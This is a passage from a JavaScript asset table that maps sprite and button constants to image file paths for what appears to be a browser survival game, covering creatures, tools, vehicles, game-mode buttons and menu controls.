      DIAMOND_DOOR_SPIKED: "img/day-diamond-spike-door.png",
      DIAMOND_DOOR_SPIKEN: "img/night-diamond-spike-door.png",
      AMETHYST_DOOR_SPIKED: "img/day-amethyst-spike-door.png",
      AMETHYST_DOOR_SPIKEN: "img/night-amethyst-spike-door.png",
      INV_REIDITE_DOOR_SPIKE_OUT: "img/inv-reidite-spike-door-out.png",
      INV_REIDITE_DOOR_SPIKE_IN: "img/inv-reidite-spike-door-in.png",
      INV_REIDITE_DOOR_SPIKE_CLICK: "img/inv-reidite-spike-door-click.png",
      INV_REIDITE_DOOR_OUT: "img/inv-reidite-door-out.png",
      INV_REIDITE_DOOR_IN: "img/inv-reidite-door-in.png",
      INV_REIDITE_DOOR_CLICK: "img/inv-reidite-door-click.png",
      INV_REIDITE_SPIKE_OUT: "img/inv-reidite-spike-out.png",
      INV_REIDITE_SPIKE_IN: "img/inv-reidite-spike-in.png",
      INV_REIDITE_SPIKE_CLICK: "img/inv-reidite-spike-click.png",
      INV_REIDITE_WALL_OUT: "img/inv-reidite-wall-out.png",
      INV_REIDITE_WALL_IN: "img/inv-reidite-wall-in.png",
      INV_REIDITE_WALL_CLICK: "img/inv-reidite-wall-click.png",
      REIDITE_WALLD: "img/day-reidite-wall.png",
      REIDITE_WALLN: "img/night-reidite-wall.png",
      REIDITE_DOORD: "img/day-reidite-door.png",
      REIDITE_DOORN: "img/night-reidite-door.png",
      REIDITE_SPIKED: "img/day-reidite-spike.png",
      REIDITE_SPIKEN: "img/night-reidite-spike.png",
      REIDITE_DOOR_SPIKED: "img/day-reidite-spike-door.png",
      REIDITE_DOOR_SPIKEN: "img/night-reidite-spike-door.png",
      INV_PICK_REIDITE_OUT: "img/inv-reidite-pickaxe-out.png",
      INV_PICK_REIDITE_IN: "img/inv-reidite-pickaxe-in.png",
      INV_PICK_REIDITE_CLICK: "img/inv-reidite-pickaxe-click.png",
      PICK_REIDITED: "img/day-reidite-pickaxe.png",
      PICK_REIDITEN: "img/night-reidite-pickaxe.png",
      INV_HAMMER_REIDITE_OUT: "img/inv-reidite-hammer-out.png",
      INV_HAMMER_REIDITE_IN: "img/inv-reidite-hammer-in.png",
      INV_HAMMER_REIDITE_CLICK: "img/inv-reidite-hammer-click.png",
      HAMMER_REIDITED: "img/day-reidite-hammer.png",
      HAMMER_REIDITEN: "img/night-reidite-hammer.png",
      WATERMELOND: "img/day-watermelon1.png",
      WATERMELONN: "img/night-watermelon1.png",
      DRIED_WATERMELOND: "img/day-watermelon-dried1.png",
      DRIED_WATERMELONN: "img/night-watermelon-dried1.png",
      INV_WATERMELON_OUT: "img/inv-watermelon-out.png",
      INV_WATERMELON_IN: "img/inv-watermelon-in.png",
      INV_WATERMELON_CLICK: "img/inv-watermelon-click.png",
      BOATD: "img/day-boat.png",
      BOATN: "img/night-boat.png",
      BOAT_WAVED: "img/day-boat-wave.png",
      BOAT_WAVEN: "img/night-boat-wave.png",
      INV_BOAT_OUT: "img/inv-boat-out.png",
      INV_BOAT_IN: "img/inv-boat-in.png",
      INV_BOAT_CLICK: "img/inv-boat-click.png",
      PLANED: "img/day-plane.png",
      PLANEN: "img/night-plane.png",
      INV_PLANE_OUT: "img/inv-plane-out.png",
      INV_PLANE_IN: "img/inv-plane-in.png",
      INV_PLANE_CLICK: "img/inv-plane-click.png",
      SLEDD: "img/day-sled.png",
      SLEDN: "img/night-sled.png",
      SLED_WAVED: "img/day-sled-wave.png",
      SLED_WAVEN: "img/night-sled-wave.png",
      INV_SLED_OUT: "img/inv-sled-out.png",
      INV_SLED_IN: "img/inv-sled-in.png",
      INV_SLED_CLICK: "img/inv-sled-click.png",
      PIRATE_HATD: "img/day-pirate-hat.png",
      PIRATE_HATN: "img/night-pirate-hat.png",
      INV_PIRATE_HAT_OUT: "img/inv-pirate-hat-out.png",
      INV_PIRATE_HAT_IN: "img/inv-pirate-hat-in.png",
      INV_PIRATE_HAT_CLICK: "img/inv-pirate-hat-click.png",
      PENGUIND: "img/day-penguin.png",
      PENGUINN: "img/night-penguin.png",
      HURT_PENGUIN: "img/hurt-penguin.png",
      INV_PENGUIN_FEATHER: "img/inv-penguin-feather-click.png",
      INV_HAWK_FEATHER: "img/inv-hawk-feather-click.png",
      BOARD: "img/day-boar1.png",
      BOAR_TAMEDD: "img/day-boar1-tamed.png",
      BOAR_ANGRYD: "img/day-boar1-angry.png",
      BOARN: "img/night-boar1.png",
      BOAR_TAMEDN: "img/night-boar1-tamed.png",
      BOAR_ANGRYN: "img/night-boar1-angry.png",
      INV_MOUNT_BOAR_OUT: "img/inv-mount-boar-out.png",
      INV_MOUNT_BOAR_IN: "img/inv-mount-boar-in.png",
      INV_MOUNT_BOAR_CLICK: "img/inv-mount-boar-click.png",
      HURT_BOAR: "img/day-hurt-boar1.png",
      BOAR_STEP: "img/boar1-step.png",
      SADDLED: "img/day-saddle1.png",
      SADDLEN: "img/night-saddle1.png",
      INV_SADDLE_OUT: "img/inv-saddle-out.png",
      INV_SADDLE_IN: "img/inv-saddle-in.png",
      INV_SADDLE_CLICK: "img/inv-saddle-click.png",
      WAND1D: "img/day-magic-wand0.png",
      WAND1N: "img/night-magic-wand0.png",
      LIGHT_WAND1D: "img/day-light-wand1.png",
      LIGHT_WAND1N: "img/night-light-wand1.png",
      INV_WAND1_OUT: "img/inv-magic-wand0-out.png",
      INV_WAND1_IN: "img/inv-magic-wand0-in.png",
      INV_WAND1_CLICK: "img/inv-magic-wand0-click.png",
      WAND2D: "img/day-magic-wand1.png",
      WAND2N: "img/night-magic-wand1.png",
      LIGHT_WAND0D: "img/day-light-wand0.png",
      LIGHT_WAND0N: "img/night-light-wand0.png",
      INV_WAND2_OUT: "img/inv-magic-wand1-out.png",
      INV_WAND2_IN: "img/inv-magic-wand1-in.png",
      INV_WAND2_CLICK: "img/inv-magic-wand1-click.png",
      FIREFLYD: "img/day-firefly.png",
      FIREFLYN: "img/night-firefly.png",
      HURT_FIREFLY: "img/hurt-firefly.png",
      INV_FIREFLY_OUT: "img/inv-firefly-out.png",
      INV_FIREFLY_IN: "img/inv-firefly-in.png",
      INV_FIREFLY_CLICK: "img/inv-firefly-click.png",
      BABY_DRAGOND: "img/day-baby-dragon.png",
      BABY_DRAGONN: "img/night-baby-dragon.png",
      BABY_DRAGON_ATTACKD: "img/day-baby-dragon-angry.png",
      BABY_DRAGON_ATTACKN: "img/night-baby-dragon-angry.png",
      BABY_DRAGON_TAMEDD: "img/day-baby-dragon-tamed.png",
      BABY_DRAGON_TAMEDN: "img/night-baby-dragon-tamed.png",
      BABY_DRAGON_WING_LEFT_ATTACKD: "img/day-wing-dragon-left-angry.png",
      BABY_DRAGON_WING_LEFT_ATTACKN: "img/night-dragon-wing-left-angry.png",
      BABY_DRAGON_WING_RIGHT_ATTACKD: "img/day-wing-dragon-right-angry.png",
      BABY_DRAGON_WING_RIGHT_ATTACKN: "img/night-dragon-wing-right-angry.png",
      BABY_DRAGON_WING_LEFT_TAMEDD: "img/day-wing-dragon-left-tamed.png",
      BABY_DRAGON_WING_LEFT_TAMEDN: "img/night-dragon-wing-left-tamed.png",
      BABY_DRAGON_WING_RIGHT_TAMEDD: "img/day-wing-dragon-right-tamed.png",
      BABY_DRAGON_WING_RIGHT_TAMEDN: "img/night-wing-dragon-right-tamed.png",
      BABY_DRAGON_WING_LEFTD: "img/day-wing-dragon-left.png",
      BABY_DRAGON_WING_LEFTN: "img/night-dragon-wing-left.png",
      BABY_DRAGON_WING_RIGHTD: "img/day-wing-dragon-right.png",
      BABY_DRAGON_WING_RIGHTN: "img/night-wing-dragon-right.png",
      HURT_BABY_DRAGON: "img/hurt-baby-dragon.png",
      HURT_BABY_DRAGON_WING_LEFT: "img/hurt-baby-dragon-wing-left.png",
      HURT_BABY_DRAGON_WING_RIGHT: "img/hurt-baby-dragon-wing-right.png",
      INV_BABY_DRAGON_OUT: "img/inv-baby-dragon-out.png",
      INV_BABY_DRAGON_IN: "img/inv-baby-dragon-in.png",
      INV_BABY_DRAGON_CLICK: "img/inv-baby-dragon-click.png",
      BABY_LAVAD: "img/day-baby-lava.png",
      BABY_LAVAN: "img/night-baby-lava.png",
      BABY_LAVA_ATTACKD: "img/day-baby-lava-angry.png",
      BABY_LAVA_ATTACKN: "img/night-baby-lava-angry.png",
      BABY_LAVA_TAMEDD: "img/day-baby-lava-tamed.png",
      BABY_LAVA_TAMEDN: "img/night-baby-lava-tamed.png",
      BABY_LAVA_WING_LEFT_ATTACKD: "img/day-wing-lava-left-angry.png",
      BABY_LAVA_WING_LEFT_ATTACKN: "img/night-wing-lava-left-angry.png",
      BABY_LAVA_WING_RIGHT_ATTACKD: "img/day-wing-lava-right-angry.png",
      BABY_LAVA_WING_RIGHT_ATTACKN: "img/night-wing-lava-right-angry.png",
      BABY_LAVA_WING_LEFT_TAMEDD: "img/day-wing-lava-left-tamed.png",
      BABY_LAVA_WING_LEFT_TAMEDN: "img/night-wing-lava-left-tamed.png",
      BABY_LAVA_WING_RIGHT_TAMEDD: "img/day-wing-lava-right-tamed.png",
      BABY_LAVA_WING_RIGHT_TAMEDN: "img/night-wing-lava-right-tamed.png",
      BABY_LAVA_WING_LEFTD: "img/day-wing-lava-left.png",
      BABY_LAVA_WING_LEFTN: "img/night-wing-lava-left.png",
      BABY_LAVA_WING_RIGHTD: "img/day-wing-lava-right.png",
      BABY_LAVA_WING_RIGHTN: "img/night-wing-lava-right.png",
      HURT_BABY_LAVA: "img/hurt-baby-lava.png",
      HURT_BABY_LAVA_WING_LEFT: "img/hurt-baby-lava-wing-left.png",
      HURT_BABY_LAVA_WING_RIGHT: "img/hurt-baby-lava-wing-right.png",
      INV_BABY_LAVA_OUT: "img/inv-baby-lava-out.png",
      INV_BABY_LAVA_IN: "img/inv-baby-lava-in.png",
      INV_BABY_LAVA_CLICK: "img/inv-baby-lava-click.png",
      HAWKD: "img/day-falcon.png",
      HAWKN: "img/night-falcon.png",
      HAWK_ATTACKD: "img/day-falcon-angry.png",
      HAWK_ATTACKN: "img/night-falcon-angry.png",
      HAWK_GROUNDD: "img/day-falcon-ground.png",
      HAWK_GROUNDN: "img/night-falcon-ground.png",
      HAWK_GROUND_ATTACKD: "img/day-falcon-ground-angry.png",
      HAWK_GROUND_ATTACKN: "img/night-falcon-ground-angry.png",
      HAWK_WING_LEFTD: "img/day-falcon-wings-left.png",
      HAWK_WING_LEFTN: "img/night-falcon-wings-left.png",
      HAWK_WING_RIGHTD: "img/day-falcon-wings-right.png",
      HAWK_WING_RIGHTN: "img/night-falcon-wings-right.png",
      HAWK_WING_LEFT_ATTACKD: "img/day-falcon-angry-wings-left.png",
      HAWK_WING_LEFT_ATTACKN: "img/night-falcon-angry-wings-left.png",
      HAWK_WING_RIGHT_ATTACKD: "img/day-falcon-angry-wings-right.png",
      HAWK_WING_RIGHT_ATTACKN: "img/night-falcon-angry-wings-right.png",
      HAWK_WING_LEFT_TAMEDD: "img/day-falcon-wings-left-tamed.png",
      HAWK_WING_LEFT_TAMEDN: "img/night-falcon-wings-left-tamed.png",
      HAWK_WING_RIGHT_TAMEDD: "img/day-falcon-wings-right-tamed.png",
      HAWK_WING_RIGHT_TAMEDN: "img/night-falcon-wings-right-tamed.png",
      HAWK_TAMEDD: "img/day-falcon-tamed.png",
      HAWK_TAMEDN: "img/night-falcon-tamed.png",
      HURT_HAWK_GROUND: "img/hurt-falcon-ground.png",
      HURT_HAWK: "img/hurt-falcon.png",
      HURT_HAWK_WING_LEFT: "img/hurt-falcon-wings-left.png",
      HURT_HAWK_WING_RIGHT: "img/hurt-falcon-wings-right.png",
      INV_HAWK_OUT: "img/inv-falcon-out.png",
      INV_HAWK_IN: "img/inv-falcon-in.png",
      INV_HAWK_CLICK: "img/inv-falcon-click.png",
      CRAB_BOSSD: "img/day-crab-boss.png",
      CRAB_BOSSN: "img/night-crab-boss.png",
      CRAB_BOSS_ATTACKD: "img/day-crab-boss-angry.png",
      CRAB_BOSS_ATTACKN: "img/night-crab-boss-angry.png",
      CRAB_BOSS_TAMEDD: "img/day-crab-boss-tamed.png",
      CRAB_BOSS_TAMEDN: "img/night-crab-boss-tamed.png",
      CRAB_BOSS_CLAW_LEFT_ATTACKD: "img/day-crab-boss-claw-left-attack.png",
      CRAB_BOSS_CLAW_LEFT_ATTACKN: "img/night-crab-boss-claw-left-attack.png",
      CRAB_BOSS_CLAW_RIGHT_ATTACKD: "img/day-crab-boss-claw-right-attack.png",
      CRAB_BOSS_CLAW_RIGHT_ATTACKN: "img/night-crab-boss-claw-right-attack.png",
      CRAB_BOSS_CLAW_LEFT_TAMEDD: "img/day-crab-boss-claw-left-tamed.png",
      CRAB_BOSS_CLAW_LEFT_TAMEDN: "img/night-crab-boss-claw-left-tamed.png",
      CRAB_BOSS_CLAW_RIGHT_TAMEDD: "img/day-crab-boss-claw-right-tamed.png",
      CRAB_BOSS_CLAW_RIGHT_TAMEDN: "img/night-crab-boss-claw-right-tamed.png",
      CRAB_BOSS_CLAW_LEFTD: "img/day-crab-boss-claw-left.png",
      CRAB_BOSS_CLAW_LEFTN: "img/night-crab-boss-claw-left.png",
      CRAB_BOSS_CLAW_RIGHTD: "img/day-crab-boss-claw-right.png",
      CRAB_BOSS_CLAW_RIGHTN: "img/night-crab-boss-claw-right.png",
      HURT_CRAB_BOSS: "img/hurt-crab-boss.png",
      HURT_CRAB_BOSS_CLAW_LEFT: "img/hurt-crab-boss-claw-left.png",
      HURT_CRAB_BOSS_CLAW_RIGHT: "img/hurt-crab-boss-claw-right.png",
      HEAL_CRAB_BOSS: "img/heal-crab-boss.png",
      HEAL_CRAB_BOSS_CLAW_LEFT: "img/heal-crab-boss-claw-left.png",
      HEAL_CRAB_BOSS_CLAW_RIGHT: "img/heal-crab-boss-claw-right.png",
      CRAB_STEP: "img/crab-step.png",
      INV_CRAB_BOSS_OUT: "img/inv-crab-boss-out.png",
      INV_CRAB_BOSS_IN: "img/inv-crab-boss-in.png",
      INV_CRAB_BOSS_CLICK: "img/inv-crab-boss-click.png",
      CACTUSD: "img/day-cactus10.png",
      CACTUSN: "img/night-cactus10.png",
      INV_CACTUS_OUT: "img/inv-cactus-out.png",
      INV_CACTUS_IN: "img/inv-cactus-in.png",
      INV_CACTUS_CLICK: "img/inv-cactus-click.png",
      SCORPIOND: "img/day-scorpion.png",
      SCORPIONN: "img/night-scorpion.png",
      SCORPION_HAND_LEFTD: "img/day-scorpion-hand-left.png",
      SCORPION_HAND_LEFTN: "img/night-scorpion-hand-left.png",
      SCORPION_HAND_RIGHTD: "img/day-scorpion-hand-right.png",
      SCORPION_HAND_RIGHTN: "img/night-scorpion-hand-right.png",
      HURT_SCORPION: "img/hurt-scorpion.png",
      HURT_SCORPION_HAND_LEFT: "img/hurt-scorpion-hand-left.png",
      HURT_SCORPION_HAND_RIGHT: "img/hurt-scorpion-hand-right.png",
      VULTURED: "img/day-vulture.png",
      VULTUREN: "img/night-vulture.png",
      VULTURE_ATTACKD: "img/day-vulture-angry.png",
      VULTURE_ATTACKN: "img/night-vulture-angry.png",
      VULTURE_GROUNDD: "img/day-vulture-ground.png",
      VULTURE_GROUNDN: "img/night-vulture-ground.png",
      VULTURE_GROUND_ATTACKD: "img/day-vulture-ground-angry.png",
      VULTURE_GROUND_ATTACKN: "img/night-vulture-ground-angry.png",
      VULTURE_WING_LEFTD: "img/day-vulture-wings-left.png",
      VULTURE_WING_LEFTN: "img/night-vulture-wings-left.png",
      VULTURE_WING_RIGHTD: "img/day-vulture-wings-right.png",
      VULTURE_WING_RIGHTN: "img/night-vulture-wings-right.png",
      VULTURE_WING_LEFT_ATTACKD: "img/day-vulture-angry-wings-left.png",
      VULTURE_WING_LEFT_ATTACKN: "img/night-vulture-angry-wings-left.png",
      VULTURE_WING_RIGHT_ATTACKD: "img/day-vulture-angry-wings-right.png",
      VULTURE_WING_RIGHT_ATTACKN: "img/night-vulture-angry-wings-right.png",
      VULTURE_WING_LEFT_TAMEDD: "img/day-vulture-wings-left-tamed.png",
      VULTURE_WING_LEFT_TAMEDN: "img/night-vulture-wings-left-tamed.png",
      VULTURE_WING_RIGHT_TAMEDD: "img/day-vulture-wings-right-tamed.png",
      VULTURE_WING_RIGHT_TAMEDN: "img/night-vulture-wings-right-tamed.png",
      VULTURE_TAMEDD: "img/day-vulture-tamed.png",
      VULTURE_TAMEDN: "img/night-vulture-tamed.png",
      HURT_VULTURE_GROUND: "img/hurt-vulture-ground.png",
      HURT_VULTURE: "img/hurt-vulture.png",
      HURT_VULTURE_WING_LEFT: "img/hurt-vulture-wings-left.png",
      HURT_VULTURE_WING_RIGHT: "img/hurt-vulture-wings-right.png",
      ALOE_VERAD: "img/day-aloe-vera.png",
      ALOE_VERAN: "img/night-aloe-vera.png",
      INV_ALOE_VERA_OUT: "img/inv-aloe-vera-out.png",
      INV_ALOE_VERA_IN: "img/inv-aloe-vera-in.png",
      INV_ALOE_VERA_CLICK: "img/inv-aloe-vera-click.png",
      ALOE_VERA_GROWND: "img/day-aloe-vera-grown.png",
      ALOE_VERA_GROWNN: "img/night-aloe-vera-grown.png",
      ALOE_VERA_DRIEDD: "img/day-aloe-vera-dried.png",
      ALOE_VERAN_DRIEDN: "img/night-aloe-vera-dried.png",
      TURBAN1D: "img/day-turban1.png",
      TURBAN1N: "img/night-turban1.png",
      TURBAN2D: "img/day-turban2.png",
      TURBAN2N: "img/night-turban2.png",
      INV_TURBAN2_OUT: "img/inv-turban2-out.png",
      INV_TURBAN2_IN: "img/inv-turban2-in.png",
      INV_TURBAN2_CLICK: "img/inv-turban2-click.png",
      INV_TURBAN1_OUT: "img/inv-turban1-out.png",
      INV_TURBAN1_IN: "img/inv-turban1-in.png",
      INV_TURBAN1_CLICK: "img/inv-turban1-click.png",
      PITCHFORK2D: "img/day-pitchfork2.png",
      PITCHFORK2N: "img/night-pitchfork2.png",
      INV_PITCHFORK2_OUT: "img/inv-pitchfork2-out.png",
      INV_PITCHFORK2_IN: "img/inv-pitchfork2-in.png",
      INV_PITCHFORK2_CLICK: "img/inv-pitchfork2-click.png",
      INV_PITCHFORK_PART_CLICK: "img/inv-gold-fork-click.png",
      INV_PILOT_GLASSES_CLICK: "img/inv-pilot-glasses-click.png",
      PILOT_HELMETD: "img/day-pilot-helmet.png",
      PILOT_HELMETN: "img/night-pilot-helmet.png",
      INV_PILOT_HELMET_OUT: "img/inv-pilot-helmet-out.png",
      INV_PILOT_HELMET_IN: "img/inv-pilot-helmet-in.png",
      INV_PILOT_HELMET_CLICK: "img/inv-pilot-helmet-click.png",
      SAND_WORM0D: "img/day-sandworm0.png",
      SAND_WORM1D: "img/day-sandworm1.png",
      SAND_WORM2D: "img/day-sandworm2.png",
      SAND_WORM0N: "img/night-sandworm0.png",
      SAND_WORM1N: "img/night-sandworm1.png",
      SAND_WORM2N: "img/night-sandworm2.png",
      HURT_SAND_WORM0: "img/hurt-sandworm0.png",
      HURT_SAND_WORM1: "img/hurt-sandworm1.png",
      HURT_SAND_WORM2: "img/hurt-sandworm2.png",
      INV_VULTURE_FEATHER: "img/inv-vulture-feather-click.png",
      EMERALD0D: "img/day-emerald0.png",
      EMERALD0N: "img/night-emerald0.png",
      EMERALD1D: "img/day-emerald1.png",
      EMERALD1N: "img/night-emerald1.png",
      EMERALD2D: "img/day-emerald2.png",
      EMERALD2N: "img/night-emerald2.png",
      INV_EMERALD: "img/inv-emerald-click.png",
      INV_SANDWORM_JUICE_OUT: "img/inv-sworm-juice-out.png",
      INV_SANDWORM_JUICE_IN: "img/inv-sworm-juice-in.png",
      INV_SANDWORM_JUICE_CLICK: "img/inv-sworm-juice-click.png",
      EMERALD_MACHINED: "img/day-point-machine.png",
      EMERALD_MACHINEN: "img/night-point-machine.png",
      EMERALD_MACHINE_HOLED: "img/day-point-machine-hole.png",
      EMERALD_MACHINE_HOLEN: "img/night-point-machine-hole.png",
      EMERALD_MACHINE_GROUNDD: "img/day-point-machine-ground.png",
      EMERALD_MACHINE_GROUNDN: "img/night-point-machine-ground.png",
      EMERALD_MACHINE_ROTATED: "img/day-point-machine-rotate.png",
      EMERALD_MACHINE_ROTATEN: "img/night-point-machine-rotate.png",
      INV_EMERALD_MACHINE_OUT: "img/inv-point-machine-out.png",
      INV_EMERALD_MACHINE_IN: "img/inv-point-machine-in.png",
      INV_EMERALD_MACHINE_CLICK: "img/inv-point-machine-click.png",
      EXTRACTOR_MACHINE0_STONED: "img/day-extractor-machine0-stone.png",
      EXTRACTOR_MACHINE0_STONEN: "img/night-extractor-machine0-stone.png",
      EXTRACTOR_MACHINE_STONED: "img/day-extractor-machine-stone.png",
      EXTRACTOR_MACHINE_STONEN: "img/night-extractor-machine-stone.png",
      INV_EXTRACTOR_MACHINE_STONE_OUT: "img/inv-extractor-machine-stone-out.png",
      INV_EXTRACTOR_MACHINE_STONE_IN: "img/inv-extractor-machine-stone-in.png",
      INV_EXTRACTOR_MACHINE_STONE_CLICK: "img/inv-extractor-machine-stone-click.png",
      EXTRACTOR_MACHINE0_GOLDD: "img/day-extractor-machine0-gold.png",
      EXTRACTOR_MACHINE0_GOLDN: "img/night-extractor-machine0-gold.png",
      EXTRACTOR_MACHINE_GOLDD: "img/day-extractor-machine-gold.png",
      EXTRACTOR_MACHINE_GOLDN: "img/night-extractor-machine-gold.png",
      INV_EXTRACTOR_MACHINE_GOLD_OUT: "img/inv-extractor-machine-gold-out.png",
      INV_EXTRACTOR_MACHINE_GOLD_IN: "img/inv-extractor-machine-gold-in.png",
      INV_EXTRACTOR_MACHINE_GOLD_CLICK: "img/inv-extractor-machine-gold-click.png",
      EXTRACTOR_MACHINE0_DIAMONDD: "img/day-extractor-machine0-diamond.png",
      EXTRACTOR_MACHINE0_DIAMONDN: "img/night-extractor-machine0-diamond.png",
      EXTRACTOR_MACHINE_DIAMONDD: "img/day-extractor-machine-diamond.png",
      EXTRACTOR_MACHINE_DIAMONDN: "img/night-extractor-machine-diamond.png",
      INV_EXTRACTOR_MACHINE_DIAMOND_OUT: "img/inv-extractor-machine-diamond-out.png",
      INV_EXTRACTOR_MACHINE_DIAMOND_IN: "img/inv-extractor-machine-diamond-in.png",
      INV_EXTRACTOR_MACHINE_DIAMOND_CLICK: "img/inv-extractor-machine-diamond-click.png",
      EXTRACTOR_MACHINE0_AMETHYSTD: "img/day-extractor-machine0-amethyst.png",
      EXTRACTOR_MACHINE0_AMETHYSTN: "img/night-extractor-machine0-amethyst.png",
      EXTRACTOR_MACHINE_AMETHYSTD: "img/day-extractor-machine-amethyst.png",
      EXTRACTOR_MACHINE_AMETHYSTN: "img/night-extractor-machine-amethyst.png",
      INV_EXTRACTOR_MACHINE_AMETHYST_OUT: "img/inv-extractor-machine-amethyst-out.png",
      INV_EXTRACTOR_MACHINE_AMETHYST_IN: "img/inv-extractor-machine-amethyst-in.png",
      INV_EXTRACTOR_MACHINE_AMETHYST_CLICK: "img/inv-extractor-machine-amethyst-click.png",
      EXTRACTOR_MACHINE0_REIDITED: "img/day-extractor-machine0-reidite.png",
      EXTRACTOR_MACHINE0_REIDITEN: "img/night-extractor-machine0-reidite.png",
      EXTRACTOR_MACHINE_REIDITED: "img/day-extractor-machine-reidite.png",
      EXTRACTOR_MACHINE_REIDITEN: "img/night-extractor-machine-reidite.png",
      INV_EXTRACTOR_MACHINE_REIDITE_OUT: "img/inv-extractor-machine-reidite-out.png",
      INV_EXTRACTOR_MACHINE_REIDITE_IN: "img/inv-extractor-machine-reidite-in.png",
      INV_EXTRACTOR_MACHINE_REIDITE_CLICK: "img/inv-extractor-machine-reidite-click.png",
      EXTRACTOR_CASES: "img/extractor-cases.png",
      HEND: "img/day-golden-hen.png",
      HENN: "img/night-golden-hen.png",
      CHICKEND: "img/day-golden-chicken.png",
      CHICKENN: "img/night-golden-chicken.png",
      HURT_GOLDEN_HEN: "img/hurt-golden-hen.png",
      HURT_GOLDEN_CHICKEN: "img/hurt-golden-chicken.png",
      LOGO_INTERFACE: "img/logo-interface.png",
      FOREST_MODE_HOVER: "img/forest-mode-hover.png",
      NORMAL_MODE_HOVER: "img/normal-mode-hover.png",
      VAMPIRE_MODE_HOVER: "img/vampire-mode-hover.png",
      ZOMBIE_MODE_HOVER: "img/zombie-mode-hover.png",
      MODE_COMMUNITY_HOVER: "img/community-mode-hover2.png",
      MODE_EXPERIMENTAL_HOVER: "img/experimental-mode-hover.png",
      ZOMBIE_MODE_OUT: "img/zombie-mode-out.png",
      ZOMBIE_MODE_IN: "img/zombie-mode-in.png",
      ZOMBIE_MODE_CLICK: "img/zombie-mode-click.png",
      VAMPIRE_MODE_OUT: "img/vampire-mode-out.png",
      VAMPIRE_MODE_IN: "img/vampire-mode-in.png",
      VAMPIRE_MODE_CLICK: "img/vampire-mode-click.png",
      NORMAL_MODE_OUT: "img/normal-mode-out.png",
      NORMAL_MODE_IN: "img/normal-mode-in.png",
      NORMAL_MODE_CLICK: "img/normal-mode-click.png",
      FOREST_MODE_OUT: "img/forest-mode-out.png",
      FOREST_MODE_IN: "img/forest-mode-in.png",
      FOREST_MODE_CLICK: "img/forest-mode-click.png",
      MODE_COMMUNITY_OUT: "img/community-mode-out.png",
      MODE_COMMUNITY_IN: "img/community-mode-in.png",
      MODE_COMMUNITY_CLICK: "img/community-mode-click.png",
      MODE_EXPERIMENTAL_OUT: "img/experimental-modes-out.png",
      MODE_EXPERIMENTAL_IN: "img/experimental-modes-in.png",
      MODE_EXPERIMENTAL_CLICK: "img/experimental-modes-click.png",
      YOUTUBE_BUTTON_OUT: "img/youtube-button-out.png",
      YOUTUBE_BUTTON_IN: "img/youtube-button-in.png",
      YOUTUBE_BUTTON_CLICK: "img/youtube-button-click.png",
      WIKI_BUTTON_OUT: "img/wiki-button-out.png",
      WIKI_BUTTON_IN: "img/wiki-button-in.png",
      WIKI_BUTTON_CLICK: "img/wiki-button-click.png",
      TWITTER_BUTTON_OUT: "img/twitter-button-out.png",
      TWITTER_BUTTON_IN: "img/twitter-button-in.png",
      TWITTER_BUTTON_CLICK: "img/twitter-button-click.png",
      FACEBOOK_BUTTON_OUT: "img/facebook-button-out.png",
      FACEBOOK_BUTTON_IN: "img/facebook-button-in.png",
      FACEBOOK_BUTTON_CLICK: "img/facebook-button-click.png",
      REDDIT_BUTTON_OUT: "img/reddit-button-out.png",
      REDDIT_BUTTON_IN: "img/reddit-button-in.png",
      REDDIT_BUTTON_CLICK: "img/reddit-button-click.png",
      DISCORD_BUTTON_OUT: "img/discord-button-out.png",
      DISCORD_BUTTON_IN: "img/discord-button-in.png",
      DISCORD_BUTTON_CLICK: "img/discord-button-click.png",
      MERCH_BUTTON_OUT: "img/merch-button-out.png",
      MERCH_BUTTON_IN: "img/merch-button-in.png",
      MERCH_BUTTON_CLICK: "img/merch-button-click.png",
      TERMINAL_BUTTON_OUT: "img/terminal-button-out.png",
      TERMINAL_BUTTON_IN: "img/terminal-button-in.png",
      TERMINAL_BUTTON_CLICK: "img/terminal-button-click.png",
      RESTART_OUT: "img/restart-out.png",
      RESTART_IN: "img/restart-in.png",
      RESTART_CLICK: "img/restart-click.png",
      GUIDE_OUT: "img/guide-out.png",
      GUIDE_IN: "img/guide-in.png",
      GUIDE_CLICK: "img/guide-click.png",
      COPY_PASTE_OUT: "img/copy-paste-out.png",
      COPY_PASTE_IN: "img/copy-paste-in.png",
      COPY_PASTE_CLICK: "img/copy-paste-click.png",
      LINKS_BG: "img/link-buttons-bg.png",
      CHANGELOG_BOX: "img/changelog-box2.png",
      CHANGELOG_BUTTON_OUT: "img/changelog_29.png",
      DEVASTIO_BUTTON_OUT: "img/banner-devast.png",
      PROFILE_BUTTON_OUT: "img/profile-button-out.png",
      PROFILE_BUTTON_IN: "img/profile-button-in.png",
      PROFILE_BUTTON_CLICK: "img/profile-button-click.png",
      LOGIN_BUTTON_OUT: "img/login-button-out.png",
      LOGIN_BUTTON_IN: "img/login-button-in.png",
      LOGIN_BUTTON_CLICK: "img/login-button-click.png",
      LOGIN_GOOGLE_OUT: "img/login-google-out.png",
      LOGIN_GOOGLE_IN: "img/login-google-in.png",
      LOGIN_GOOGLE_CLICK: "img/login-google-click.png",
      LOGIN_FACEBOOK_OUT: "img/login-facebook-out.png",
      LOGIN_FACEBOOK_IN: "img/login-facebook-in.png",
      LOGIN_FACEBOOK_CLICK: "img/login-facebook-click.png",
      ACCOUNT_BOX: "img/account-box.png",
      ACCOUNT_MAINTENANCE: "img/account-under-maintenance.png",
      CLOSE_BUTTON_OUT: "img/close-button-account-out.png",
      CLOSE_BUTTON_IN: "img/close-button-account-in.png",
      CLOSE_BUTTON_CLICK: "img/close-button-account-click.png",
      PLAY_BUTTON_OUT: "img/play-button-out.png",
      PLAY_BUTTON_IN: "img/play-button-in.png",
      PLAY_BUTTON_CLICK: "img/play-button-click.png",
      APP_STORE_BADGE: "img/app-store-badge.png",
      PLAY_STORE_BADGE: "img/play-store-badge.png",
      MOBILE_BOXAD: "img/mobile-boxad.png",
      MODIFY_NAME_OUT: "img/modify-name-out.png",
      MODIFY_NAME_IN: "img/modify-name-in.png",
      MODIFY_NAME_CLICK: "img/modify-name-click.png",
      YES_BUTTON_OUT: "img/yes-button-out.png",
      YES_BUTTON_IN: "img/yes-button-in.png",
      YES_BUTTON_CLICK: "img/yes-button-click.png",
      YES_300_BUTTON_OUT: "img/yes-300-button-out.png",
      YES_300_BUTTON_IN: "img/yes-300-button-in.png",
      YES_300_BUTTON_CLICK: "img/yes-300-button-click.png",
      NO_BUTTON_OUT: "img/no-button-out.png",
      NO_BUTTON_IN: "img/no-button-in.png",
      NO_BUTTON_CLICK: "img/no-button-click.png",
      NO_THANKS_BUTTON_OUT: "img/no-thanks-button-out.png",
